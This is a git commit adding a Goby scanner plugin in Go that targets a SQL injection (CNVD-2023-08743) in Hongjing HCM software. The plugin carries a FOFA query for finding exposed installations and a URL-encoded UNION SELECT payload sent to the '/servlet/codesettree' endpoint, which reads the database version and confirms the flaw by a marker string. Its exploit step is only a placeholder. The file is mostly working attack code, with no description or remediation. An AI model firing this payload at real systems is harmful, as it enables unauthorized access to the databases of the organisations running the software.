9505c643dee3a8ad95526bcd9cb3c50201998e29
清晨 <37011241+qingchenhh@users.noreply.github.com>
2023-05-31 12:55:38 +0800

    Add files via upload

---
+++ Goby/HCM_categories_sql_injection_CNVD_2023_08743.go
@@ -0,0 +1,143 @@
+package exploits
+
+import (
+	"git.gobies.org/goby/goscanner/goutils"
+)
+
+func init() {
+	expJson := `{
+  "Name": "宏景HCM categories SQL注入 CNVD-2023-08743",
+  "Description": "",
+  "Product": "",
+  "Homepage": "",
+  "DisclosureDate": null,
+  "Author": "清晨",
+  "FofaQuery": "body=\"宏景软件 版权所有\" ||  icon_hash=\"947874108\"",
+  "GobyQuery": "body=\"宏景软件 版权所有\" ||  icon_hash=\"947874108\"",
+  "Level": "3",
+  "Impact": "",
+  "Recommendation": "",
+  "References": [],
+  "Is0day": false,
+  "HasExp": false,
+  "ExpParams": [],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27abchelloabc~31~31~31~27~2c~40~40version~2d~2d",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "abchelloabc111",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/test.php",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "test",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
+  "Tags": [],
+  "VulType": [],
+  "CVEIDs": [
+    ""
+  ],
+  "CNNVD": [
+    ""
+  ],
+  "CNVD": [
+    ""
+  ],
+  "CVSSScore": "",
+  "Translation": {
+    "CN": {
+      "Name": "宏景HCM categories SQL注入 CNVD-2023-08743",
+      "Product": "",
+      "Description": "",
+      "Recommendation": "",
+      "Impact": "",
+      "VulType": [],
+      "Tags": []
+    },
+    "EN": {
+      "Name": "HCM categories sql injection CNVD-2023-08743",
+      "Product": "",
+      "Description": "",
+      "Recommendation": "",
+      "Impact": "",
+      "VulType": [],
+      "Tags": []
+    }
+  },
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}`
+
+	ExpManager.AddExploit(NewExploit(
+		goutils.GetFileName(),
+		expJson,
+		nil,
+		nil,
+	))
+}
